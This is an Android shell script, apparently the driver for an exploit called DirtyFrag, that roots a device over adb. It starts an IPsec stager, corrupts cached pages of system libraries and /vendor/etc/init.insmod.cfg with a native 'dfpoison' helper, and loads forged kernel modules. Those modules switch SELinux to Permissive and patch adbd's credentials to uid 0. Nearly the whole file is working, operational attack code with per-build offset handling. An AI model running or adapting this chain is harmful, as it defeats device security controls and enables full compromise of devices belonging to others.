#!/system/bin/sh
# run.sh — DirtyFrag --adb-root, on-device.
#
# Old fast/consistent flow (native dfpoison for ALL targets, SETTLE=3, no Java
# q3.Writer) with two robustness additions borrowed from the new run.sh:
#   1. reap_stale_stagers() — kill orphaned q3.Stager that holds the fixed SPI.
#   2. inject-restore      — revert the inject-lib stub after settle, via native
#                            dfpoison (NOT Java), so a later re-map of inject-lib
#                            cannot XOR the carrier back.
#
# Push (in addition to fugu/e2e.dex/targets):
#   adb push dfpoison /data/local/tmp/dfpoison
#   adb shell chmod 755 /data/local/tmp/dfpoison
#
# Usage:
#   sh run.sh                              # auto-detect from ro.build.version.incremental
#   sh run.sh <target_name>                # force a specific target
#   sh run.sh <target_name> <settle_sec>   # force target, override settle (seconds)
#   sh run.sh "" <settle_sec>              # auto-detect target, override settle

DF=/data/local/tmp/fugu
TMP=/data/local/tmp
SETTLE=3

SPI=0xdeadbe10
KEYMAT=0x41

log()  { echo "[$(date +%H:%M:%S)] $*"; }
die()  { echo "FAIL: $*" >&2; exit 1; }

# ---- 2-level JSON value extractor (busybox-awk safe) ----
json_get() {
    awk -v top="$2" -v key="$3" '
        !in_top {
            if ($0 ~ ("\"" top "\"[[:space:]]*:[[:space:]]*\\{")) in_top = 1
            next
        }
        in_top {
            if ($0 ~ /^[[:space:]]*\}/) exit
            kp = "\"" key "\""
            p = index($0, kp)
            if (p == 0) next
            s = substr($0, p + length(kp))
            sub(/^[[:space:]]*:[[:space:]]*/, "", s)
            if (substr(s, 1, 1) == "\"") {
                sub(/^"/, "", s); sub(/".*/, "", s)
                print s; exit
            }
            sub(/[^0-9A-Za-z].*/, "", s)
            print s; exit
        }
    ' "$1"
}

# ---- reap orphaned q3.Stager processes ----
# An interrupted run (force-stop, crash, app update) can leave its backgrounded
# stager alive as a PPID-1 orphan. That orphan holds the fixed IPsec SPI
# (0xdeadbe10) for up to 30 minutes and every subsequent attempt fails at
# createTransform with:
#   "No such IpSecService$SpiRecord found for given id: -1"
# Kill any process whose cmdline contains q3.Stager before we try to allocate.
reap_stale_stagers() {
    if command -v pgrep >/dev/null 2>&1; then
        reaped=0
        for pid in $(pgrep -f 'q3\.Stager' 2>/dev/null); do
            [ "$pid" = "$$" ] && continue
            log "reaping orphaned q3.Stager pid=$pid"
            kill -9 "$pid" 2>/dev/null && reaped=$((reaped+1))
        done
        [ "$reaped" -gt 0 ] && log "reaped $reaped orphaned stager(s)" || true
        return 0
    fi
    reaped=0
    for pdir in /proc/[0-9]*; do
        [ -r "$pdir/cmdline" ] || continue
        cmd=$(tr '\0' ' ' < "$pdir/cmdline" 2>/dev/null)
        case "$cmd" in
            *q3.Stager*)
                pid=$(basename "$pdir")
                [ "$pid" = "$$" ] && continue
                log "reaping orphaned q3.Stager pid=$pid"
                kill -9 "$pid" 2>/dev/null && reaped=$((reaped+1))
                ;;
        esac
    done
    [ "$reaped" -gt 0 ] && log "reaped $reaped orphaned stager(s)" || true
    return 0
}

# ---------- resolve target ----------
DEV_BUILD=$(getprop ro.build.version.incremental)
[ -n "$DEV_BUILD" ] || die "getprop ro.build.version.incremental returned empty"

if [ -n "$1" ]; then
    TARGET="$1"
    log "target $TARGET (forced on cmdline, device build $DEV_BUILD)"
else
    TARGET=""
    for json in "$DF"/targets/*.json; do
        [ -e "$json" ] || continue
        name=$(basename "$json" .json)
        if grep -q "\"build_incremental\"[[:space:]]*:[[:space:]]*\"$DEV_BUILD\"" "$json"; then
            TARGET="$name"
            break
        fi
    done
    [ -n "$TARGET" ] || die "no target JSON under $DF/targets/ matches device build $DEV_BUILD"
    log "target $TARGET (auto-detected from device build $DEV_BUILD)"
fi

# Optional 2nd arg: settle override in seconds.
#   sh run.sh <target> [<settle_sec>]
#   sh run.sh "" <settle_sec>     # auto-detect target, override settle
if [ -n "$2" ]; then
    case "$2" in
        ''|*[!0-9.]*) die "bad settle_sec arg: $2" ;;
        *) SETTLE="$2" ;;
    esac
    log "settle override: ${SETTLE}s (from argv)"
fi

JSON="$DF/targets/$TARGET.json"
TG="$DF/targets/$TARGET"
[ -f "$JSON" ] || die "no $JSON"

# ---------- read JSON ----------
MERGED=$(json_get "$JSON" kernel merged)

DSEL=$(json_get "$JSON" kernel delta_selinux_from_anchor)
DFV=$(json_get "$JSON" kernel delta_findvpid_from_anchor)
DPT=$(json_get "$JSON" kernel delta_pidtask_from_anchor)
DSSUSE=$(json_get "$JSON" kernel delta_ssuse_from_anchor)
ENF_OFF=$(json_get "$JSON" kernel enforcing_off)
CRED_OFF=$(json_get "$JSON" kernel cred_off)
CRED_SEC_OFF=$(json_get "$JSON" kernel cred_security_off)

CARRIER_PATH=$(json_get "$JSON" carrier device_path)
CARRIER_LOCAL=$(json_get "$JSON" carrier local_ko)
ANCHOR_RELOC=$(json_get "$JSON" carrier anchor_reloc_off)

INJECT_KEY=inject_lib
INJECT_LIB=$(json_get "$JSON" inject_lib device_path)
if [ -z "$INJECT_LIB" ]; then
    INJECT_KEY=libeva
    INJECT_LIB=$(json_get "$JSON" libeva device_path)
fi
GAP_OFF=$(json_get "$JSON" "$INJECT_KEY" stub_gap_off)
GAP_SIZE=$(json_get "$JSON" "$INJECT_KEY" stub_gap_size)
CTOR_OFF=$(json_get "$JSON" "$INJECT_KEY" orig_ctor_off)
IA_OFF=$(json_get "$JSON" "$INJECT_KEY" init_array_off)

DUMP_OFF=$(json_get "$JSON" libandroid_servers dump_off)
DUMP_SIZE=$(json_get "$JSON" libandroid_servers dump_size)

CFG_OFF=$(json_get "$JSON" cfg inject_off)
CFG_LEN=$(json_get "$JSON" cfg inject_len)
[ -n "$CFG_OFF" ] || CFG_OFF=0x21
[ -n "$CFG_LEN" ] || CFG_LEN=54
SHELL_CFG_JSON=$(json_get "$JSON" cfg shell_poison_under_enforcing)
case "$SHELL_CFG_JSON" in
    true) SHELL_CFG=1 ;;
    *)    SHELL_CFG=0 ;;
esac

CARRIER_KO=$(basename "$CARRIER_LOCAL")
CARRIER_SRC="$DF/targets/$CARRIER_LOCAL"

# Q3-only fields (empty for merged targets)
CRED_CARRIER_LOCAL=$(json_get "$JSON" cred_carrier local_ko)
if [ -n "$CRED_CARRIER_LOCAL" ]; then
    CRED_CARRIER_SRC="$DF/targets/$CRED_CARRIER_LOCAL"
else
    CRED_CARRIER_SRC=""
fi

# sanity
for v in DSEL DFV DPT DSSUSE ENF_OFF CRED_OFF CRED_SEC_OFF \
         CARRIER_PATH CARRIER_LOCAL INJECT_LIB \
         GAP_OFF GAP_SIZE CTOR_OFF IA_OFF DUMP_OFF DUMP_SIZE; do
    eval "val=\$$v"
    [ -n "$val" ] || die "missing $v from $JSON"
done

log "resolved: carrier=$CARRIER_PATH inject_lib=$INJECT_LIB shell_cfg=$SHELL_CFG merged=$MERGED"

# ---------- preflight ----------
ge_before=$(getenforce)
uid_before=$(id -u)
log "before: getenforce=$ge_before  uid=$uid_before"

[ -x "$DF/fugu" ]              || die "no $DF/fugu"
[ -f "$CARRIER_SRC" ]          || die "no $CARRIER_SRC"
[ -f "$TG/init.insmod.cfg" ]   || die "no init.insmod.cfg under $TG"
[ -f "$TMP/e2e.dex" ]          || die "no e2e.dex"
[ -x "$TMP/dfpoison" ]         || die "no $TMP/dfpoison (push the native helper)"

ADBD_PID=$(pidof adbd)
[ -n "$ADBD_PID" ] || die "pidof adbd"
log "adbd pid = $ADBD_PID"

# Clear any stale Stager from a previous interrupted attempt before we try to
# allocate the fixed SPI.
reap_stale_stagers

# ---------- stage SA ----------
log "stage SA"
rm -f "$TMP/stager.log" "$TMP/stager.err"
cd "$TMP"
CLASSPATH=e2e.dex app_process / q3.Stager 1800 > "$TMP/stager.log" 2> "$TMP/stager.err" &
STAGER_PID=$!
log "stager pid = $STAGER_PID"

cleanup() {
    if [ -n "${STAGER_PID:-}" ]; then
        kill "$STAGER_PID" 2>/dev/null
        STAGER_PID=""
    fi
    reap_stale_stagers
}
trap cleanup EXIT INT TERM

PORT=""
i=0
while [ "$i" -lt 40 ]; do
    sleep 1
    PORT=$(grep -oE 'ENCAPPORT=[0-9]+' "$TMP/stager.log" 2>/dev/null | head -1 | cut -d= -f2)
    [ -n "$PORT" ] && break
    kill -0 "$STAGER_PID" 2>/dev/null || break
    i=$((i + 1))
done
[ -n "$PORT" ] || { cat "$TMP/stager.log" "$TMP/stager.err" 2>/dev/null; die "no ENCAPPORT"; }
log "SA live on port $PORT"

# =====================================================================
# Q3 two-carrier flow (non-merged)
# =====================================================================
if [ "$MERGED" != "true" ]; then
    [ -n "$CRED_CARRIER_SRC" ] || die "non-merged target needs cred_carrier section in $JSON"
    [ -f "$CRED_CARRIER_SRC" ] || die "no $CRED_CARRIER_SRC"

    # v79 trampoline targets use auto_root.sh (libc trampoline instead of inject-stub)
    TRAMPOLINE=$(json_get "$JSON" trampoline libc_path)
    if [ -n "$TRAMPOLINE" ]; then
        log "trampoline target — copying files + delegating to auto_root.sh"
        # auto_root.sh expects files in /data/local/tmp/
        for f in ivm_writer iv_table_256.bin Stager.jar \
                 spec_ivm_emb.bin spec_libas.bin spec_libc_caves.bin spec_libc_rela.bin \
                 spec_cred2.bin cfg_records.bin cfg_records_vudc.bin ko_records.bin; do
            [ -f "$TG/$f" ] && cp "$TG/$f" "$TMP/$f"
        done
        chmod 755 "$TMP/ivm_writer" 2>/dev/null
        sh "$TG/auto_root.sh"
        exit $?
    fi

    # ---- STAGE 1: build flip carrier + patched cfg, ctor poisons them ----
    log "stage 1: simple-carrier (enforcing=0) on $CARRIER_KO"
    "$DF/fugu" simple-carrier "$CARRIER_SRC" "$TMP/flip.ko" \
        "$ANCHOR_RELOC" "$DSEL" || die "simple-carrier"

    log "stage 1: patch-cfg (2-file ctor)"
    "$DF/fugu" patch-cfg "$TG/init.insmod.cfg" "$CFG_OFF" "$CFG_LEN" \
        "$CARRIER_PATH" "$TMP/cfg_patched.bin" || die "patch-cfg"

    log "stage 1: inject.spec (2 files: flip.ko + cfg)"
    "$DF/fugu" inject-stub \
        "$SPI" "$KEYMAT" "$PORT" \
        "$CTOR_OFF" "$GAP_OFF" "$GAP_SIZE" "$IA_OFF" \
        "$TMP/out_inject.spec" \
        "$CARRIER_PATH" "$CARRIER_SRC" "$TMP/flip.ko" \
        /vendor/etc/init.insmod.cfg "$TG/init.insmod.cfg" "$TMP/cfg_patched.bin" || die "inject-stub"

    log "stage 1: libas.spec"
    "$DF/fugu" libas-stub \
        /dev/socket/property_service ctl.restart trackingservice \
        "$DUMP_OFF" "$DUMP_SIZE" "$TMP/out_libas.spec" || die "libas-stub"

    log "stage 1: poison inject-lib + libandroid (native dfpoison, Stager SA :$PORT)"
    out=$("$TMP/dfpoison" "$PORT" "$SPI" "$KEYMAT" \
        "$INJECT_LIB" "$TMP/out_inject.spec" \
        /system/lib64/libandroid_servers.so "$TMP/out_libas.spec" 2>&1)
    echo "$out"
    case "$out" in *"wrote="*) : ;; *) die "dfpoison batch (stage 1)" ;; esac

    log "stage 1: dumpsys input -> trackingservice restart"
    PID0=$(pidof trackingservice)
    dumpsys input >/dev/null 2>&1
    PID1=$PID0
    i=0
    while [ "$i" -lt 180 ]; do
        sleep 0.1
        PID1=$(pidof trackingservice)
        [ -n "$PID1" ] && [ "$PID1" != "$PID0" ] && break
        i=$((i + 1))
    done
    [ -z "$PID1" ]       && die "trackingservice died"
    [ "$PID1" = "$PID0" ] && die "trackingservice did not restart"
    log "trackingservice $PID0 -> $PID1"
    log "settling ${SETTLE}s for ctor to poison flip.ko + cfg"
    sleep "$SETTLE"

    log "stage 1: insmod_sh (flip SELinux)"
    setprop ctl.start insmod_sh

    ge_mid=$ge_before
    i=0
    while [ "$i" -lt 120 ]; do
        sleep 0.1
        ge_mid=$(getenforce)
        [ "$ge_mid" = "Permissive" ] && break
        i=$((i + 1))
    done
    [ "$ge_mid" = "Permissive" ] || die "stage 1 failed: getenforce=$ge_mid (expected Permissive)"
    log "stage 1 OK: SELinux $ge_before -> $ge_mid"

    # ---- STAGE 2: cred carrier (usbip-vudc) -> insmod -> adbd cred-patched ----
    log "stage 2: cred-carrier from $(basename "$CRED_CARRIER_LOCAL")"
    "$DF/fugu" cred-carrier "$CRED_CARRIER_SRC" "$TMP/uv.ko" \
        "$DSEL" "$DFV" "$DPT" "$ADBD_PID" "$DSSUSE" \
        "$ENF_OFF" "$CRED_OFF" "$CRED_SEC_OFF" || die "cred-carrier"

    log "stage 2: cfg.spec (insmod /data/local/tmp/uv.ko)"
    "$DF/fugu" cfg "$TG/init.insmod.cfg" "$CFG_OFF" "$CFG_LEN" \
        /data/local/tmp/uv.ko "$TMP/out_cfg_pe.spec" || die "cfg"

    log "stage 2: poison init.insmod.cfg (native dfpoison, Stager SA :$PORT)"
    cat /vendor/etc/init.insmod.cfg >/dev/null 2>&1
    out=$("$TMP/dfpoison" "$PORT" "$SPI" "$KEYMAT" \
        /vendor/etc/init.insmod.cfg "$TMP/out_cfg_pe.spec" 2>&1)
    echo "$out"
    case "$out" in *"wrote="*) : ;; *) die "dfpoison cfg (stage 2)" ;; esac

    log "stage 2: insmod_sh (load uv.ko, cred-patch adbd)"
    setprop ctl.start insmod_sh

    rooted=0
    ge_final=$ge_mid
    i=0
    while [ "$i" -lt 120 ]; do
        sleep 0.1
        ge_final=$(getenforce)
        adbd_uid=$(grep -m1 '^Uid:' /proc/"$ADBD_PID"/status 2>/dev/null | awk '{print $2}')
        if [ "$adbd_uid" = "0" ] && [ "$ge_final" = "Permissive" ]; then
            rooted=1; break
        fi
        i=$((i + 1))
    done

    echo ""
    echo "  target     : $TARGET"
    echo "  getenforce : $ge_before -> $ge_final"
    echo "  adbd uid   : $(grep -m1 '^Uid:' /proc/$ADBD_PID/status 2>/dev/null | awk '{print $2}')  (this shell: $(id -u))"
    echo ""
    if [ "$rooted" = "1" ]; then
        echo "OK — root adb ready. Open a NEW adb shell to get uid 0."
        exit 0
    else
        echo "FAIL — chain did not complete."
        echo "  dmesg | grep -iE '$CARRIER_KO|usbip|module|avc'"
        exit 1
    fi
fi

# =====================================================================
# Merged shell flow (QPro / Q3S / Q2)
# =====================================================================

log "build cred carrier"
"$DF/fugu" cred-carrier \
    "$CARRIER_SRC" "$TMP/rdbg_cred.ko" \
    "$DSEL" "$DFV" "$DPT" "$ADBD_PID" "$DSSUSE" \
    "$ENF_OFF" "$CRED_OFF" "$CRED_SEC_OFF" || die "cred-carrier"

STUB_LEN=""
if [ "$SHELL_CFG" = "1" ]; then
    log "build inject.spec (1 file: carrier)"
    stub_out=$("$DF/fugu" inject-stub \
        "$SPI" "$KEYMAT" "$PORT" \
        "$CTOR_OFF" "$GAP_OFF" "$GAP_SIZE" "$IA_OFF" \
        "$TMP/out_inject.spec" \
        "$CARRIER_PATH" "$CARRIER_SRC" "$TMP/rdbg_cred.ko" 2>&1) || die "inject-stub"
    echo "$stub_out"
else
    log "build patched cfg (for 2-file ctor)"
    "$DF/fugu" patch-cfg "$TG/init.insmod.cfg" "$CFG_OFF" "$CFG_LEN" \
        "$CARRIER_PATH" "$TMP/cfg_patched.bin" || die "patch-cfg"

    log "build inject.spec (2 files: carrier + cfg)"
    stub_out=$("$DF/fugu" inject-stub \
        "$SPI" "$KEYMAT" "$PORT" \
        "$CTOR_OFF" "$GAP_OFF" "$GAP_SIZE" "$IA_OFF" \
        "$TMP/out_inject.spec" \
        "$CARRIER_PATH" "$CARRIER_SRC" "$TMP/rdbg_cred.ko" \
        /vendor/etc/init.insmod.cfg "$TG/init.insmod.cfg" "$TMP/cfg_patched.bin" 2>&1) || die "inject-stub"
    echo "$stub_out"
fi
STUB_LEN=$(echo "$stub_out" | grep -oE 'stub=[0-9]+B' | head -1 | cut -d= -f2 | tr -d 'B')
[ -n "$STUB_LEN" ] || die "could not parse stub length from inject-stub output"
log "inject stub length = ${STUB_LEN}B"

log "build libas.spec"
"$DF/fugu" libas-stub \
    /dev/socket/property_service ctl.restart trackingservice \
    "$DUMP_OFF" "$DUMP_SIZE" "$TMP/out_libas.spec" || die "libas-stub"

log "poison inject-lib + libandroid (native dfpoison, Stager SA :$PORT)"
out=$("$TMP/dfpoison" "$PORT" "$SPI" "$KEYMAT" \
    "$INJECT_LIB" "$TMP/out_inject.spec" \
    /system/lib64/libandroid_servers.so "$TMP/out_libas.spec" 2>&1)
echo "$out"
case "$out" in *"wrote="*) : ;; *) die "dfpoison batch" ;; esac

log "dumpsys input -> trackingservice restart"
PID0=$(pidof trackingservice)
dumpsys input >/dev/null 2>&1
PID1=$PID0
i=0
while [ "$i" -lt 180 ]; do
    sleep 0.1
    PID1=$(pidof trackingservice)
    [ -n "$PID1" ] && [ "$PID1" != "$PID0" ] && break
    i=$((i + 1))
done
[ -z "$PID1" ]       && die "trackingservice died"
[ "$PID1" = "$PID0" ] && die "trackingservice did not restart"
log "trackingservice $PID0 -> $PID1"
log "settling ${SETTLE}s for ctor to poison $CARRIER_KO"
sleep "$SETTLE"

# Revert the inject-lib gap stub back to zeros + restore init_array[0] to the
# original ctor, so any process that maps inject-lib after this point does not
# re-fire the stub and XOR the carrier page cache a second time. Uses native
# dfpoison (same SA), not Java q3.Writer.
log "revert inject-lib stub before module load"
"$DF/fugu" inject-restore "$GAP_OFF" "$STUB_LEN" "$IA_OFF" "$CTOR_OFF" \
    "$TMP/out_inject_revert.spec" || die "inject-restore"

out=$("$TMP/dfpoison" "$PORT" "$SPI" "$KEYMAT" \
    "$INJECT_LIB" "$TMP/out_inject_revert.spec" 2>&1)
echo "$out"
case "$out" in *"wrote="*) : ;; *) die "dfpoison revert inject-lib" ;; esac

if [ "$SHELL_CFG" = "1" ]; then
    log "build cfg.spec"
    "$DF/fugu" cfg "$TG/init.insmod.cfg" "$CFG_OFF" "$CFG_LEN" \
        "$CARRIER_PATH" "$TMP/out_cfg.spec" || die "cfg"

    log "poison init.insmod.cfg (native dfpoison, Stager SA :$PORT)"
    cat /vendor/etc/init.insmod.cfg >/dev/null 2>&1
    out=$("$TMP/dfpoison" "$PORT" "$SPI" "$KEYMAT" \
        /vendor/etc/init.insmod.cfg "$TMP/out_cfg.spec" 2>&1)
    echo "$out"
    case "$out" in *"wrote="*) : ;; *) die "dfpoison cfg" ;; esac
else
    log "cfg already poisoned by ctor (shell not readable under Enforcing)"
fi

log "setprop ctl.start insmod_sh"
setprop ctl.start insmod_sh

log "verify"
rooted=0
ge_after=$ge_before
i=0
while [ "$i" -lt 120 ]; do
    sleep 0.1
    ge_after=$(getenforce)
    adbd_uid=$(grep -m1 '^Uid:' /proc/"$ADBD_PID"/status 2>/dev/null | awk '{print $2}')
    if [ "$adbd_uid" = "0" ] && [ "$ge_after" = "Permissive" ]; then
        rooted=1; break
    fi
    i=$((i + 1))
done

echo ""
echo "  target     : $TARGET"
echo "  getenforce : $ge_before -> $ge_after"
echo "  adbd uid   : $(grep -m1 '^Uid:' /proc/$ADBD_PID/status 2>/dev/null | awk '{print $2}')  (this shell: $(id -u))"
echo ""
if [ "$rooted" = "1" ]; then
    echo "OK — root adb ready. Open a NEW adb shell to get uid 0."
    exit 0
else
    echo "FAIL — chain did not complete."
    echo "  dmesg | grep -iE '$CARRIER_KO|module|avc'"
    exit 1
fi